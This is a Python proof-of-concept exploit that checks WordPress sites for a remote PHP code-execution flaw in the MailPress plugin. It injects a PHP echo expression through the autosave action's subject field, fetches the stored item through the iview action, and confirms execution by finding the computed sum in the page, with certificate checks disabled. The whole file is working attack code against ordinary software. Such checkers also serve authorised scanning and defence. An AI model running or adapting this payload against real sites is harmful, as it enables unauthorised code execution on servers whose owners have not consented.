import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r=randomInt(800000000, 1000000000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r11=randomInt(800000000, 1000000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"wp-content/plugins/mailpress/mp-includes/action.php"
	body="action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo "+str(r)+"%2b"+str(r11)+";?>&html=&plaintext=&mail_format=standard&autosave=1"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if True:
		r0=True
		try:
			ids=re.findall("<autosave id='(.+?)'",response.text)[0]
		except:
			ids=''
	else:
		r0=False
		ids=''
	url=baseurl+"wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id="+ids
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r + r11) in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
